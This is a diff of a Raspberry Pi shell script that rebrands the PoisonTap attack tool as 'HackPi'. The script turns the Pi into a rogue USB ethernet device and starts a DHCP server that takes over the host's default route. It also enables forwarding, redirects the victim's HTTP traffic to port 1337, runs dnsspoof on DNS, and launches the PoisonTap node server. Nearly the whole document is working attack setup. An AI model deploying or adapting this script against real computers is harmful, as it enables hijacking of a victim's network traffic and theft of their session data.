@@ -1,32 +1,22 @@
 #!/bin/sh
 #
-# PoisonTap
-#  by samy kamkar
-#  http://samy.pl/poisontap
-#  01/08/2016
+# HackPi
+#  by wismna
+#  http://github.com/wismna/raspberry-pi/hackpi
+#  14/01/2017
 #
-# If you find this doesn't come up automatically as an ethernet device
-# change idVendor/idProduct to 0x04b3/0x4010
 
 cd /sys/kernel/config/usb_gadget/
-mkdir -p poisontap
-cd poisontap
+mkdir -p hackpi
+cd hackpi
 
 OS=`cat /home/pi/os.txt`
 HOST="48:6f:73:74:50:43"
 SELF0="42:61:64:55:53:42"
 SELF1="42:61:64:55:53:43"
 
-#echo 0x0B95 > idVendor # ASIX
-#echo 0x772B > idProduct # 8772B
-#echo 0x0002 > bcdDevice # Revision 2 > 8772C
-#echo 0x0bda > idVendor
-#echo 0x8152 > idProduct
-#echo 0x2001 > bcdDevice
-echo 0x04b3 > idVendor  # IN CASE BELOW DOESN'T WORK
-echo 0x4010 > idProduct # IN CASE BELOW DOESN'T WORK
-#echo 0x1d6b > idVendor   # Linux Foundation
-#echo 0x0104 > idProduct  # Multifunction Composite Gadget
+echo 0x04b3 > idVendor
+echo 0x4010 > idProduct
 
 echo 0x0100 > bcdDevice # v1.0.0
 mkdir -p strings/0x409
@@ -76,15 +66,19 @@ ln -s functions/acm.gs0 configs/c.2
 # End functions
 ls /sys/class/udc > UDC
 
+# Start bridge interface
 ifup br0
 ifconfig br0 up
 
+# Start the DHCP server
 /sbin/route add -net 0.0.0.0/0 br0
 /etc/init.d/isc-dhcp-server start
-
-#/sbin/sysctl -w net.ipv4.ip_forward=1
+# Set some other paramaters
+/sbin/sysctl -w net.ipv4.ip_forward=1
 /sbin/iptables -t nat -A PREROUTING -i br0 -p tcp --dport 80 -j REDIRECT --to-port 1337
+# Start some servers
 /usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i br0 port 53
 /usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js 
 
+# Enable Serial
 systemctl enable getty@ttyGS0.service
